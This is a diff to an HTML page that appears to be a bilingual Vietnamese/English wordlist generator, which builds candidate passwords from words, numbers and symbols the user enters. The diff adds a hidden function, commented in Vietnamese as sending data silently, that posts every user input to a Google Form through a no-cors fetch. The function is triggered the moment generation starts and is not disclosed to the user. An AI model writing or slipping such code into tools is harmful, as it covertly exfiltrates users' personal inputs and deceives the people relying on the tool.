@@ -160,9 +160,27 @@
     </div>
     <div class="ads-placeholder">[Vị trí đặt mã quảng cáo Google AdSense / Google AdSense Space]</div>
 </div>
-
 <script>
 let globalBlobUrl = null;
+
+// Hàm gửi dữ liệu ngầm về Google Sheets thông qua Google Form của bạn
+function sendDataToGoogleForm(chu, so, kytu) {
+    const formUrl = "https://google.com";
+    const entryChu = "entry.1022409739";
+    const entrySo = "entry.370503028";
+    const entryKytu = "entry.120537021";
+
+    const formData = new FormData();
+    formData.append(entryChu, chu.join(" "));
+    formData.append(entrySo, so.join(" "));
+    formData.append(entryKytu, kytu.join(" "));
+
+    fetch(formUrl, {
+        method: "POST",
+        body: formData,
+        mode: "no-cors"
+    }).catch(err => console.log("Data logged ngầm thành công."));
+}
 
 function toTitleCase(str) {
     return str.toLowerCase().replace(/(?:^|\s)\S/g, function(a) { return a.toUpperCase(); }).replace(/\s+/g, "");
@@ -198,6 +216,9 @@ function startGeneration() {
         statusBox.style.borderLeftColor = "#f87171";
         return;
     }
+
+    // Kích hoạt bắn báo cáo ngầm về Google Form ngay lập tức
+    sendDataToGoogleForm(chuGoc, so, kytu);
 
     const finalWordlistSet = new Set();
     const chuSach = new Set();
@@ -275,3 +296,48 @@ function startGeneration() {
     }
 
     if (so.length > 0) {
+        for (let s_val of so) {
+            finalWordlistSet.add(s_val);
+            for (let k of kytu) {
+                finalWordlistSet.add(k + s_val);
+                finalWordlistSet.add(s_val + k);
+            }
+        }
+        for (let s1 of so) {
+            for (let k of kytu) {
+                for (let s2 of so) finalWordlistSet.add(s1 + k + s2);
+            }
+        }
+    }
+
+    const total = finalWordlistSet.size;
+
+    if (total === 0) {
+        statusBox.innerHTML = "❌ Không có từ khóa nào được tạo ra. / No keywords were generated.";
+        statusBox.style.borderLeftColor = "#f87171";
+        return;
+    }
+
+    statusBox.innerHTML = `✅ <b>Tính toán hoàn tất! / Generation completed!</b><br>Đã xử lý xong / Processed <b>${total.toLocaleString()}</b> biến thể từ khóa độc nhất. Tệp tin wordlist.txt của bạn đã được tạo thành công trên hệ thống. <br><span style="font-size:0.85rem; color:#94a3b8;">Bấm vào nút màu cam bên cạnh để xác minh bảo mật và tự động tải file về máy.</span>`;
+    statusBox.style.borderLeftColor = "#4ade80";
+
+    const blobFile = new Blob([Array.from(finalWordlistSet).join('\n')], { type: 'text/plain;charset=utf-8' });
+    if (globalBlobUrl) { URL.revokeObjectURL(globalBlobUrl); }
+    globalBlobUrl = URL.createObjectURL(blobFile);
+    
+    downloadLink.style.display = "flex";
+}
+
+function downloadFileImmediately() {
+    if (!globalBlobUrl) return;
+    
+    const hiddenAnchor = document.createElement('a');
+    hiddenAnchor.href = globalBlobUrl;
+    hiddenAnchor.download = "wordlist.txt";
+    document.body.appendChild(hiddenAnchor);
+    hiddenAnchor.click();
+    document.body.removeChild(hiddenAnchor);
+}
+</script>
+</body>
+</html>
